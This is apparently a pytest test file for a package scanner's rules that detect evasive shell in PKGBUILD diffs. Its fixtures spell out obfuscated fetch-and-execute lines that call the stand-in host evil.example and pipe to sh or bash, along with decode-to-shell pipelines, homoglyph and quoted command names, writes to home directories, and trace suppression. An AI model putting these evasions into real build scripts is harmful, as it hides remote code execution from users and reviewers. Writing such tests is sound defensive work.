"""Crossfire rules, and the evasions they had to survive.

A family whose whole purpose is detecting evasion is the one place where
"can the rule itself be evaded" is not a rhetorical question. Every case in
`EVASIONS` below defeated an earlier version of these rules, so each one is a
regression test rather than a hypothetical.

The recurring shape is the same in each: **a command word is not always the
first token.** An assignment, a wrapper, a redirect or a subshell opener can
each push the real command one or more tokens to the right, and a scan that
reads position zero misses all of them.
"""

import pytest

from trustsight.analysis import scan_diff
from trustsight.analysis.crossfire import crossfire_techniques


def _fire(command, function="build"):
    diff = (f"--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n {function}() {{\n"
            f"+  {command}\n }}\n")
    return set(crossfire_techniques(diff))


# ---------------------------------------------------------------------------
# X002: the rule the family rests on, and the one most worth attacking.
# ---------------------------------------------------------------------------

BYPASSES = [
    ("array-routing",       '${A[0]} https://evil.example | bash'),
    ("nameref",             '${cmd} -fsSL https://evil.example | sh'),
    ("command-substitution", '$(printf "\\x63\\x75\\x72\\x6c") evil.example'),
    ("partial-quote-double", 'c"u"rl -fsSL https://evil.example'),
    ("partial-quote-single", "c'u'rl -fsSL https://evil.example"),
    ("backtick",            '`echo curl` https://evil.example'),
    ("ansi-c-string",       "$'\\x63\\x75\\x72\\x6c' https://evil.example"),
]


@pytest.mark.parametrize("label,command", BYPASSES)
def test_every_known_tokenizer_bypass_fires_x002(label, command):
    """The bypass and the alarm are the same event."""
    assert "X002" in _fire(command), label


EVASIONS = [
    # Each of these hid the command word from an earlier version.
    ("env-assignment-prefix", 'FOO=1 ${A[0]} https://evil.example'),
    ("env-wrapper",           'env ${A[0]} https://evil.example'),
    ("exec-wrapper",          'exec ${A[0]} https://evil.example'),
    ("sudo-wrapper",          'sudo ${A[0]} https://evil.example'),
    ("nohup-wrapper",         'nohup ${A[0]} https://evil.example'),
    ("command-builtin",       'command ${A[0]} https://evil.example'),
    ("timeout-with-number",   'timeout 5 ${A[0]} https://evil.example'),
    ("leading-redirect",      '>out ${A[0]} https://evil.example'),
    ("subshell",              '( ${A[0]} https://evil.example )'),
    ("leading-tab",           '\t${A[0]} https://evil.example'),
    # A conditional keyword takes a *command* and tests its exit status, so
    # the payload runs exactly as it would without one. The scan stopped at
    # the keyword and never looked past it, which made every one of these a
    # one-word bypass of a CRITICAL rule.
    ("if-keyword",            'if ${A[0]} -fsSL https://evil.example; then :; fi'),
    ("elif-keyword",          'elif ${A[0]} https://evil.example; then :; fi'),
    ("while-keyword",         'while ${A[0]} https://evil.example; do :; done'),
    ("until-keyword",         'until ${A[0]} https://evil.example; do :; done'),
]


@pytest.mark.parametrize("label,command", EVASIONS)
def test_x002_survives_command_word_displacement(label, command):
    """A prefix moves the command word; it does not hide it."""
    assert "X002" in _fire(command), label


def test_an_escaped_name_is_the_tokenizer_s_now():
    """`c\\url` is `curl`, and X002 stands down because the fold works.

    This is the progression the module docstring asks for. The escape
    reached no rule at all - not R001, not anything - so X002 claimed it as
    a technique. Then the tokenizer was taught to drop the escape, which is
    the real fix: *every* rule that reads a command name sees through it,
    not only this one. With the name resolved, a shape here would score one
    command twice, the same reason `curl""` never had one.

    Both halves are asserted, because a fold that silently stopped working
    would leave the payload with no cover at all.
    """
    def fired(command):
        diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n build() {\n"
                f"+  {command}\n }}\n")
        return {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}

    assert "R001" in fired('curl"" -fsSL https://evil.example | bash')
    assert "X002" not in _fire('curl"" -fsSL https://evil.example | bash')

    assert "R001" in fired('c\\url -fsSL https://evil.example | bash')
    assert "X002" not in _fire('c\\url -fsSL https://evil.example | bash')

    assert "R002" in fired('w\\get -qO- https://evil.example | sh')


def test_x002_stands_down_when_the_tokenizer_resolved_the_name():
    """A resolved name is the payload rules' business, not this one's.

    `A=curl` then `$A ...` reduces to a literal, so the resolved text carries
    the payload and R001 claims it. X002 firing too would score one command
    twice and would report an evasion where none happened.
    """
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
            "+  A=curl\n+  $A -fsSL https://evil.example | bash\n }\n")
    assert "X002" not in set(crossfire_techniques(diff))

    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
    assert "R001" in fired, "the resolved payload must still be caught"


NOT_COMMANDS = [
    # Each of these fired on the benign corpus before it was excluded.
    ("assignment-rhs",     'font=`grep -o -e "THE FONT" License.rtf | head -1`'),
    ("continuation-flag",  '-i "${installDir}/dkms.conf"'),
    ("arithmetic",         "(( $(vercmp $2 '1.3.0-2') >= 0 )) && return"),
    ("sed-pipe-separator", 'sed -i \'s|"$LIBS -lavcodec"|"$LIBS"|\' configure'),
    ("plain-command",      'make DESTDIR="$pkgdir" install'),
    ("configure",          './configure --prefix=/usr'),
    # A variable that names a *directory* hides nothing: the executable is
    # spelled out right beside it. Admitting the conditional keywords above
    # exposed three more shapes behind them, each of which fired CRITICAL
    # on the benign corpus.
    ("srcdir-binary",      '"$srcdir/calibre-release/calibre-debug" --version'),
    ("braced-dir-binary",  '"${srcdir}/linuxq3apoint-1.32b-3.x86.run" --tar xf'),
    ("env-prefix-binary",  'QT_QPA_PLATFORM=offscreen "$srcdir/x/ebook-convert" --version'),
    ("arithmetic-after-if", "if (( $(vercmp $2 '1.3.0-2') >= 0 )); then :; fi"),
    ("assignment-value",   'if outmsg=$(eval "$(updpkgsrcs force)" 2>&1); then :; fi'),
    ("test-after-if",      'if [ -f "$srcdir/x" ]; then make; fi'),
    ("path-lookup-idiom",  'DKMS=$(which dkms)\n+  $DKMS add -m ax88179 -v 1.14.2'),
]


@pytest.mark.parametrize("label,command", NOT_COMMANDS)
def test_x002_is_silent_on_ordinary_shell(label, command):
    assert "X002" not in _fire(command), label


def test_eval_belongs_to_r039_alone():
    """One command, one rule. `eval` used to be scored twice.

    Treating it as a wrapper walked into its argument and called the
    `$(...)` there a non-literal command name, so `eval "$(updpkgsrcs ...)"`
    - benign, and in the corpus - drew a second CRITICAL beside R039's
    finding. The family's own rule is that it never claims bytes another
    rule claims; that is why R013's codepoints are not re-scored here.
    """
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n build() {\n"
            '+  eval "$(updpkgsrcs echoGitCMDForSubModule)"\n }\n')
    assert "X002" not in set(crossfire_techniques(diff))

    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
    assert "R039" in fired, "eval of dynamic content must still be caught"


def test_a_path_lookup_is_not_an_assembled_name():
    """`CMD=$(which x)` names its executable literally, one line up.

    The tokenizer cannot fold a substitution, so the name stayed
    unresolvable and X002 fired CRITICAL on `$DKMS add`. It was the whole
    of the rule's remaining benign-corpus rate outside `eval`.
    """
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n package() {\n"
            "+  DKMS=$(which dkms)\n+  $DKMS add -m ax88179_178a-dkms -v 1.14.2\n }\n")
    assert "X002" not in set(crossfire_techniques(diff))


def test_an_assembled_name_is_still_an_evasion_after_an_assignment():
    """The exemption is the discovery idiom, not assignment in general."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
            "+  CMD=$(printf '\\x63\\x75\\x72\\x6c')\n"
            "+  $CMD -fsSL https://evil.example\n }\n")
    assert "X002" in set(crossfire_techniques(diff))


# ---------------------------------------------------------------------------
# X001 and X005: the same displacement problem in two other shapes.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("label,command", [
    ("piped-to-sh",       r"printf '\x63\x75\x72' | sh"),
    ("absolute-path-sh",  r"printf '\x63\x75\x72' | /bin/sh"),
    ("env-wrapped-sh",    r"printf '\x63\x75\x72' | env sh"),
    ("no-space",          r"printf '\x63\x75\x72'|sh"),
    ("bash-dash-s",       r"printf '\x63\x75\x72' | bash -s"),
    ("xxd-reverse",       "xxd -r -p payload.hex | bash"),
    # R003 and R043 claim `base64 -d`. These decode the same payload into
    # the same shell and were claimed by nobody, which made the choice of
    # decoder the whole evasion.
    ("base32",            "echo NBSWY3DP | base32 -d | sh"),
    ("openssl-enc",       "openssl enc -base64 -d -in payload.b64 | sh"),
    ("uudecode",          "uudecode payload.uu | sh"),
])
def test_x001_catches_the_shell_however_it_is_spelled(label, command):
    """Naming the shell by path or behind `env` was an evasion."""
    assert "X001" in _fire(command), label


@pytest.mark.parametrize("label,command", [
    ("short-form", "set +x"),
    # `set +o xtrace` is the same instruction. The short form's pattern
    # required the `x` to end the option cluster, so the long spelling
    # walked past it.
    ("long-form",  "set +o xtrace"),
    ("verbose",    "set +o verbose"),
])
def test_x004_catches_both_spellings_of_trace_off(label, command):
    assert "X004" in _fire(command), label


@pytest.mark.parametrize("label,command", [
    ("literal-home",   'install -Dm755 t /home/alice/bin/x'),
    ("variable-user",  'install -Dm755 t /home/$USER/bin/x'),
    ("braced-user",    'install -Dm755 t /home/${USER}/bin/x'),
    ("double-slash",   'install -Dm755 t /home//alice/bin/x'),
    ("tilde-user",     'install -Dm755 t ~alice/bin/x'),
    ("root-home",      'cp t /root/bin/x'),
    ("home-default",   'cp t ${HOME:-/home/alice}/x'),
    ("traversal",      'cp t ../../home/alice/bin/x'),
    ("quoted",         'install -Dm755 t "/home/alice/bin/x"'),
    ("assignment-prefix", 'FOO=1 cp t /home/alice/bin/x'),
    # No trailing separator. `cp payload /home/alice` writes into exactly
    # the same directory as `/home/alice/`, and every alias pattern
    # required the slash.
    ("home-no-slash",  'cp payload /home/alice'),
    ("root-no-slash",  'cp payload /root'),
    ("tilde-no-slash", 'cp payload ~alice'),
])
def test_x005_catches_every_spelling_of_a_home_path(label, command):
    assert "X005" in _fire(command, function="post_install"), label


@pytest.mark.parametrize("label,command", [
    ("h032-owns-tilde", 'install -Dm755 t ~/bin/tool'),
    ("h032-owns-home",  'install -Dm644 c $HOME/.bashrc'),
    ("pkgdir-staging",  'install -Dm755 t "$pkgdir/home/shared/tool"'),
    ("srcdir",          'cp t "$srcdir/home/x"'),
    # `/home` with nothing after it is the parent of all homes, not
    # anybody's home, and packaging touches it legitimately. Making the
    # trailing slash optional must not reach this.
    ("home-parent",     'mkdir -p /home'),
])
def test_x005_defers_and_exempts_staging(label, command):
    """One write is scored once, and staging is not somebody's home."""
    assert "X005" not in _fire(command, function="post_install"), label


# ---------------------------------------------------------------------------
# X007 and bounds.
# ---------------------------------------------------------------------------


def test_x007_needs_two_distinct_techniques():
    from trustsight.analysis.crossfire import X007_MIN_TECHNIQUES

    assert X007_MIN_TECHNIQUES == 2
    one = _fire('${A[0]} https://evil.example')
    assert len(one) < X007_MIN_TECHNIQUES

    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,7 @@\n build() {\n"
            "+  set +x\n+  ${A[0]} https://evil.example | sh\n }\n")
    assert len(set(crossfire_techniques(diff))) >= X007_MIN_TECHNIQUES

    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
    assert "X007" in fired


# ---------------------------------------------------------------------------
# Scope: where the rules look. Every one of these ran the payload and none of
# them was read, because the gate was an allowlist of function names and a
# function name is the author's to choose.
# ---------------------------------------------------------------------------

SCOPES = [
    # makepkg calls `package_$pkgname()` for each name in a split recipe, so
    # renaming `package` to this moved a payload out of range of the whole
    # family. It is the commonest function shape in the AUR after the five
    # standard ones.
    ("split-package",      "package_libfoo"),
    # A pkgname may hold a hyphen, and `\w+` does not match one: these
    # headers matched neither expression in the shared classifier, so the
    # function never opened and its body classified as `other` - invisible
    # to every rule with a scope, not only to this family.
    ("hyphenated-split",   "package_google-chrome-bin"),
    ("lib32-split",        "package_lib32-foo"),
    # An ordinary helper, called from build().
    ("private-helper",     "_install_helper"),
]


@pytest.mark.parametrize("label,function", SCOPES)
def test_a_payload_is_read_whatever_the_function_is_called(label, function):
    assert "X002" in _fire('${A[0]} https://evil.example | sh', function=function), label


def test_top_level_code_is_read():
    """It runs when makepkg *sources* the recipe, before any build step.

    The project already documents that (`unresolved_parse_time`), and the
    family that exists to catch evasion was reading only inside functions.
    Moving a payload out of `build()` and up to the top of the file was a
    one-line bypass of all seven rules.
    """
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=x\n"
            "+${A[0]} https://evil.example | sh\n")
    assert "X002" in set(crossfire_techniques(diff))


@pytest.mark.parametrize("path,expected", [
    ("PKGBUILD", True),
    ("p.install", True),
    ("scripts/run.sh", True),
    # Not shell, in any scope. Before the file gate these were reachable
    # whenever a brace count leaked into them.
    ("app.desktop", False),
    ("fix.patch", False),
    (".SRCINFO", False),
    ("README.md", False),
])
def test_only_shell_files_are_read(path, expected):
    """Which file a line is in decides whether it is shell at all."""
    diff = (f"--- a/{path}\n+++ b/{path}\n@@ -1,3 +1,4 @@\n build() {{\n"
            "+  ${A[0]} https://evil.example | sh\n }\n")
    assert ("X002" in set(crossfire_techniques(diff))) is expected


NOT_COMMAND_POSITIONS = [
    # Each of these fired the moment the scope widened, and each is a line
    # whose command position lives somewhere else entirely.
    ("array-continuation",
     "  depends=(\n+    \"${_depends[@]}\"\n+  )"),
    ("multi-line-test",
     "  if ! [[\n+    \"${CONF_LINE}\" =~ ^[[:space:]]*(#|$)\n+  ]]; then :; fi"),
    ("multi-line-string",
     "  eval \"package_$i()\n+      $(declare -f _package_x11 | tail +2)\""),
]


@pytest.mark.parametrize("label,body", NOT_COMMAND_POSITIONS)
def test_a_line_that_continues_another_has_no_command_position(label, body):
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,6 +1,10 @@\n package_x() {\n"
            f"+{body}\n }}\n")
    assert "X002" not in set(crossfire_techniques(diff)), label


@pytest.mark.parametrize("label,command", [
    # `[[ -n "$a" && "$a" != "$b" ]]` is one test, not two commands. The
    # split on `&&` handed the second half to the scan with `"$a"` in first
    # position, and a conditional that mentions a variable is most of the
    # shell ever written.
    ("test-with-and", 'if [[ -n "$ssid" && "$ssid" != "$SSID" ]]; then :; fi'),
    ("test-with-or",  '[[ -z "$a" || -z "$b" ]] && return'),
    # `command -v x` asks where x is and runs nothing.
    ("command-lookup", 'command -v "$cmd" >/dev/null || die "missing: $cmd"'),
    ("type-lookup",    'type -p "$tool" >/dev/null'),
])
def test_a_lookup_or_a_test_is_not_an_execution(label, command):
    assert "X002" not in _fire(command), label


def test_the_payload_after_all_of_them_is_still_read():
    """The guards must not become a way in: each ends where its construct does."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,8 +1,14 @@\n package_x() {\n"
            "+  depends=(\n+    \"${_d[@]}\"\n+  )\n"
            "+  [[ -n \"$a\" && -n \"$b\" ]] && true\n"
            "+  command -v tar >/dev/null\n"
            "+  ${A[0]} https://evil.example | sh\n }\n")
    assert "X002" in set(crossfire_techniques(diff))


# ---------------------------------------------------------------------------
# Two structural faults, both of which decided *where* a rule looked rather
# than what it matched. Between them they were every remaining benign-corpus
# hit on this family.
# ---------------------------------------------------------------------------


def test_a_function_scope_does_not_leak_into_the_next_file():
    """A hunk shows part of a file, so its braces need not balance.

    `package() {` whose closing brace fell outside the hunk left the brace
    counter raised for the *rest of the diff*, which put every following
    file inside that function. In the corpus a `.desktop` file's translated
    `Name[be]=` line was scanned as shell and matched the homoglyph shape -
    Cyrillic text in a translation impersonates nothing and names no
    command. Seven benign diffs fired CRITICAL on it.
    """
    diff = (
        "diff --git a/PKGBUILD b/PKGBUILD\n--- a/PKGBUILD\n+++ b/PKGBUILD\n"
        "@@ -1,3 +1,4 @@\n package() {\n+  make install\n"
        "diff --git a/app.desktop b/app.desktop\n--- a/app.desktop\n+++ b/app.desktop\n"
        "@@ -1,2 +1,3 @@\n+Name[be]=Адкрыць менеджар\n"
    )
    assert not set(crossfire_techniques(diff))


def test_a_payload_in_a_second_file_is_still_read():
    """The reset must not become a way to hide in a later file.

    A `.install` scriptlet declares its own scope, and that scope is what
    the reset restores it to.
    """
    diff = (
        "diff --git a/PKGBUILD b/PKGBUILD\n--- a/PKGBUILD\n+++ b/PKGBUILD\n"
        "@@ -1,3 +1,4 @@\n package() {\n+  make install\n"
        "diff --git a/p.install b/p.install\n--- a/p.install\n+++ b/p.install\n"
        "@@ -1,2 +1,4 @@\n post_install() {\n+  ${A[0]} https://evil.example | sh\n }\n"
    )
    assert "X002" in set(crossfire_techniques(diff))


def test_an_edited_continuation_tail_is_not_a_command_position():
    """The joiner only joins lines carrying the same diff marker.

    Editing the tail of a backslash-continued command separates the halves
    with the removed version, so the `+` line arrives alone and its first
    word - an argument to a command two lines up - read as a command name.
    """
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,6 +1,6 @@\n build() {\n"
        '   httpdirfs "${_opts[@]}" \\\n'
        "     --dl-seg-size 1 --single-file-mode \\\n"
        '-    "${_iso_url}" "${_http_mount}" > /dev/null\n'
        '+    "${_iso_url}" "${_http_mount}"\n }\n'
    )
    assert "X002" not in set(crossfire_techniques(diff))


def test_a_joined_continuation_still_reports_its_command():
    """The guard is about a *missing* head, not about continuations."""
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,6 @@\n build() {\n"
        "+  ${A[0]} \\\n"
        "+    -fsSL https://evil.example | sh\n }\n"
    )
    assert "X002" in set(crossfire_techniques(diff))


def test_matching_is_bounded_on_a_hostile_line():
    """A5: no crossfire pattern may be made to backtrack.

    An earlier sabotage rule cost 2.4 seconds on one 8 KiB line and failed
    the `rule matching is bounded on hostile input` gate; every span in this
    module carries a constant ceiling for the same reason.
    """
    import time

    from trustsight.rules import MAX_RULE_LINE_BYTES

    for filler in ("a", '"', "$", "`", "|", "(", "-", "/"):
        line = "  " + filler * MAX_RULE_LINE_BYTES
        diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,3 @@\n build() {\n+"
                + line + "\n}\n")
        start = time.monotonic()
        crossfire_techniques(diff)
        assert time.monotonic() - start < 0.5, f"slow on {filler!r}"


def test_techniques_are_reported_deterministically():
    """Same input, same order: a report a reader can diff between runs."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,7 @@\n build() {\n"
            "+  set +x\n+  ${A[0]} https://bit.ly/x | sh\n }\n")
    first = crossfire_techniques(diff)
    for _ in range(5):
        assert crossfire_techniques(diff) == first


# ---------------------------------------------------------------------------
# Esoteric shell: the same payload, wrapped every way a PKGBUILD allows.
# ---------------------------------------------------------------------------

PAYLOAD = "https://evil.example/x"

WRAPPINGS = [
    ("plain",             f'curl {PAYLOAD} | sh'),
    ("heredoc",           f'bash <<EOF\n+curl {PAYLOAD} | sh\n+EOF'),
    ("heredoc-quoted",    f"bash <<'EOF'\n+curl {PAYLOAD} | sh\n+EOF"),
    ("here-string",       f'bash <<< "curl {PAYLOAD} | sh"'),
    ("process-subst",     f'bash <(curl -s {PAYLOAD})'),
    ("brace-expansion",   f'cur{{l,}} {PAYLOAD} | sh'),
    ("param-replace",     f'c=XurlX; ${{c//X/}} {PAYLOAD} | sh'),
    ("param-case",        f'c=CURL; ${{c,,}} {PAYLOAD} | sh'),
    ("array-slice",       f'a=(curl x); ${{a[@]:0:1}} {PAYLOAD} | sh'),
    ("case-statement",    f'case 1 in\n+1) curl {PAYLOAD} | sh ;;\n+esac'),
    ("homoglyph",         f'сurl {PAYLOAD} | sh'),
    ("semicolons",        f';;curl {PAYLOAD}|sh;;'),
    ("deep-indent",       " " * 3000 + f'curl {PAYLOAD} | sh'),
]


@pytest.mark.parametrize("label,command", WRAPPINGS)
def test_no_wrapping_hides_a_payload(label, command):
    """Every one of these carries the same fetch-and-execute payload.

    A wrapping that scores only the source-bucket prior has hidden the
    payload itself: the domain was noticed and the command was not.
    """
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,8 @@\n build() {\n"
            f"+  {command}\n }}\n")
    fact = scan_diff(diff, package_name="demo")
    fired = {e.rule_id for e in fact.score_breakdown
             if e.weight or e.severity in ("FATAL", "CRITICAL")}
    assert fired - {"SOURCE_BUCKET"}, (
        f"{label}: only the source prior fired, so the payload was hidden"
    )
    assert fact.final_score > 20, f"{label} scored {fact.final_score}"


def test_a_command_name_split_across_a_continuation_is_rejoined():
    """`cur\\` + `l` is `curl`: the shell removes the backslash-newline.

    Both joiners used to insert a space, producing `cur l` - two words, and
    every rule that matches the command name saw neither. There are two
    implementations (`join_line_continuations` and the indexed form the rule
    path uses), and fixing one left the other reachable.
    """
    from trustsight.tokenizer import join_line_continuations

    assert join_line_continuations(["+  cur\\", "+l https://x | sh"]) == [
        "+  curl https://x | sh"
    ]
    # Indentation on the continuation still separates arguments.
    assert join_line_continuations(["+  curl \\", "+    https://x"]) == [
        "+  curl    https://x"
    ]

    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n build() {\n"
            "+  cur\\\n+l https://evil.example/x | sh\n+}\n")
    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
    assert "R001" in fired, "the rejoined command must reach the payload rules"


@pytest.mark.parametrize("label,command", [
    ("cyrillic-c",  "сurl https://x | sh"),
    ("cyrillic-o",  "cоrl https://x | sh"),
    ("brace-comma", "cur{l,} https://x"),
    ("brace-range", "cmd{1..3} https://x"),
])
def test_x002_claims_assembled_and_impersonating_names(label, command):
    assert "X002" in _fire(command), label


@pytest.mark.parametrize("label,command", [
    # A typographic apostrophe impersonates nothing and names no command.
    ("prose-apostrophe", "wizard’s default settings apply here"),
    ("brace-argument",   "cp file{1,2}.txt /tmp"),
    ("emoji-echo",       "echo \U0001F600 done"),
])
def test_x002_does_not_fire_on_ordinary_non_ascii(label, command):
    """"Any non-ASCII" was too broad: it fired on English prose."""
    assert "X002" not in _fire(command), label


# ---------------------------------------------------------------------------
# X008: whitespace a shell does not split on.
# ---------------------------------------------------------------------------

#: (label, codepoint). Python calls each of these whitespace; bash splits on
#: none of them, so a word containing one stays a single word.
DECEPTIVE_SPACES = [
    ("nbsp", "\u00a0"),
    ("narrow-nbsp", "\u202f"),
    ("figure-space", "\u2007"),
    ("ogham-space", "\u1680"),
    ("ideographic-space", "\u3000"),
    ("next-line", "\u0085"),
    ("line-separator", "\u2028"),
]


@pytest.mark.parametrize("label,space", DECEPTIVE_SPACES)
def test_whitespace_a_shell_will_not_split_on_is_reported(label, space):
    """`make<NBSP>install` displays as a command and runs as one word.

    bash splits on space, tab and newline; Python's `\\s` matches all of
    these too, so a payload rule fires *around* one - R001 reported "curl
    piped to bash" for a line that runs no curl. R013 is FATAL and claims
    bidi, zero-width and tag codepoints; these are a disjoint set, so
    nothing scored or reported them.
    """
    assert "X008" in _fire(f"make{space}install"), label


@pytest.mark.parametrize("label,command", [
    ("space", "make install"),
    ("tab", "make\tinstall"),
    ("many-spaces", "make    install"),
    ("carriage-return", "make install\r"),
])
def test_ordinary_whitespace_is_not_reported(label, command):
    assert "X008" not in _fire(command), label


def test_x008_claims_no_codepoint_r013_claims():
    """The two sets are disjoint, which is why both can score.

    R013 is FATAL; double-scoring a codepoint would corrupt the calibration
    the project measures, and is the reason the bidi and homoglyph
    candidates were dropped from this family in the first place.
    """
    from trustsight.analysis import scan_diff
    from trustsight.analysis.crossfire import _DECEPTIVE_SPACE_RE

    for codepoint in ("\u200b", "\u202e", "\ufeff", "\u2066"):
        assert not _DECEPTIVE_SPACE_RE.search(codepoint), (
            f"U+{ord(codepoint):04X} is R013's, and X008 must not claim it"
        )
        diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n build() {\n"
                f"+  make{codepoint}install\n }}\n")
        fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
        assert "R013" in fired, f"U+{ord(codepoint):04X} should still be R013's"


def test_a_licence_file_is_not_a_shell_file():
    """The one benign-corpus diff carrying such a character is font licence
    text, which the file gate excludes before X008 ever sees it."""
    diff = ("--- a/LICENSE\n+++ b/LICENSE\n@@ -1,2 +1,3 @@\n"
            "+A. Limited License.\u00a0Subject to the terms\n")
    assert "X008" not in set(crossfire_techniques(diff))


# ---------------------------------------------------------------------------
# Case, and the exemption that decides whether X005 speaks at all.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("label,command", [
    # `$PKGDIR` is not a makepkg variable. It expands to nothing, so the
    # write lands in a home directory while claiming the staging exemption -
    # bought for the price of a shift key.
    ("uppercase-decoy", 'install -Dm644 x "$PKGDIR/../../home/alice/.bashrc"'),
    ("mixed-case-decoy", 'install -Dm644 x "$PkgDir/../../home/alice/.bashrc"'),
    # The exemption belongs to the target, not to the line: a real `$pkgdir`
    # somewhere else on the line used to buy silence for a write that has
    # nothing to do with staging.
    ("decoy-elsewhere", 'echo "$pkgdir" && cp payload /home/alice/.bashrc'),
    ("decoy-in-argument", 'cp "$pkgdir/x" /home/alice/.bashrc'),
])
def test_the_staging_exemption_does_not_cover_a_decoy(label, command):
    assert "X005" in _fire(command, function="package"), label


@pytest.mark.parametrize("label,command", [
    ("staged-write", 'install -Dm755 t "$pkgdir/home/shared/tool"'),
    ("staged-srcdir", 'cp t "$srcdir/home/x"'),
    ("staged-braced", 'install -Dm644 c "${pkgdir}/home/skel/.bashrc"'),
])
def test_a_genuinely_staged_write_is_still_exempt(label, command):
    """Narrowing the exemption must not turn packaging into a finding."""
    assert "X005" not in _fire(command, function="package"), label


@pytest.mark.parametrize("label,command", [
    ("uppercase-scheme-ip", 'source=("HTTPS://1.2.3.4/p.tar.gz")'),
    ("mixed-scheme-ip", 'source=("Https://1.2.3.4/p.tar.gz")'),
    ("uppercase-shortener", 'source=("HTTPS://BIT.LY/xyz")'),
])
def test_a_url_scheme_is_case_insensitive(label, command):
    """RFC 3986 says so and curl agrees, so a shift key was a way past.

    The shortener shape beside these was already case-insensitive, which is
    what makes the inconsistency an accident rather than a decision.
    """
    assert "X006" in _fire(command, function="build"), label


def test_an_encoded_host_survives_an_uppercase_scheme():
    assert "X003" in _fire("curl -fsSL HTTP://0x7f000001/p", function="build")


# ---------------------------------------------------------------------------
# X001: the executor list, which is a list.
# ---------------------------------------------------------------------------

PAYLOAD = r"printf '\x63\x75\x72\x6c'"

EXECUTORS = [
    "sh", "bash", "zsh", "dash", "ksh",
    # Every one of these ran the payload while X001 said nothing.
    "ash", "mksh", "pdksh", "yash", "posh",
    "busybox sh", "busybox ash", "/bin/busybox sh",
    "env -S sh", "env -i bash", "command -p sh",
    "source /dev/stdin", ". /dev/stdin",
    # An interpreter executes decoded bytes exactly as a shell does, and no
    # recipe pipes a hex-escape blob into one by accident.
    "python", "python3", "perl", "ruby", "node",
]


@pytest.mark.parametrize("executor", EXECUTORS)
def test_x001_catches_every_executor_spelling(executor):
    """R001 already knew about `busybox sh` and `source /dev/stdin`, which
    is the tell that the omission here was an oversight, not a boundary."""
    assert "X001" in _fire(f"{PAYLOAD} | {executor}"), executor


@pytest.mark.parametrize("command", [
    "printf 'plain text' | tee out",
    "echo hello | grep -q x",
    "cat data.txt | sort | uniq",
])
def test_x001_needs_the_encoding_not_just_a_pipe(command):
    """The escape blob is what makes an interpreter suspicious here."""
    assert "X001" not in _fire(command), command


# ---------------------------------------------------------------------------
# X003 and X004: spellings of the same instruction.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("label,command", [
    ("bare", "set +x"),
    ("x-last", "set +vx"),
    # Caught or missed on nothing but letter order, because the pattern
    # required the `x` to end the cluster.
    ("x-first", "set +xv"),
    ("x-middle", "set +vxe"),
    ("long-form", "set +o xtrace"),
    ("verbose", "set +o verbose"),
])
def test_x004_catches_every_spelling_of_trace_off(label, command):
    assert "X004" in _fire(command), label


@pytest.mark.parametrize("label,command", [
    ("bare", "TERM=dumb make"),
    # A quote sets exactly the same variable.
    ("single-quoted", "TERM='dumb' make"),
    ("double-quoted", 'TERM="dumb" make'),
    ("exported", "export TERM=dumb"),
])
def test_x004_catches_a_quoted_term(label, command):
    assert "X004" in _fire(command), label


@pytest.mark.parametrize("label,command", [
    ("stdout", "exec >/dev/null"),
    ("stderr", "exec 2>/dev/null"),
    # Appending detaches the stream as thoroughly as truncating it, and
    # `&>` takes both at once. Both were silent.
    ("append", "exec 2>>/dev/null"),
    ("both-streams", "exec &>/dev/null"),
    ("append-both", "exec &>>/dev/null"),
    ("close", "exec 2>&-"),
])
def test_x004_catches_every_detaching_redirect(label, command):
    assert "X004" in _fire(command), label


@pytest.mark.parametrize("label,command", [
    ("login-then-c", "bash -lc 'id'"),
    ("errexit-then-c", "sh -ec 'id'"),
    # The `c` may sit anywhere in the cluster: `-ce` is the same
    # instruction as `-ec`, and requiring it last let both through.
    ("c-then-errexit", "sh -ce 'id'"),
    ("c-then-login", "bash -cl 'id'"),
    # A list that named five of a dozen shells is a rename away from empty.
    ("ash", "ash -lc 'id'"),
    ("mksh", "mksh -lc 'id'"),
    ("busybox", "busybox sh -lc 'id'"),
])
def test_x003_catches_option_stuffing_in_any_order(label, command):
    assert "X003" in _fire(command), label


@pytest.mark.parametrize("command", [
    "sh -c 'make install'",
    "bash -c 'true'",
    "set -e",
    "set +e",
    "TERM=xterm make",
    "exec 3>&1",
])
def test_ordinary_shell_is_not_option_stuffing_or_suppression(command):
    """`sh -c` is how a recipe runs a command; only the *stuffing* is the
    signal, and only a stream that goes nowhere is suppression."""
    got = _fire(command)
    assert "X003" not in got and "X004" not in got, f"{command}: {got}"


@pytest.mark.parametrize("keyword", ["export", "declare", "local", "readonly", "typeset"])
def test_a_declared_assignment_still_resolves_the_name(keyword):
    """X002 is CRITICAL, so a name the tokenizer *can* resolve must not
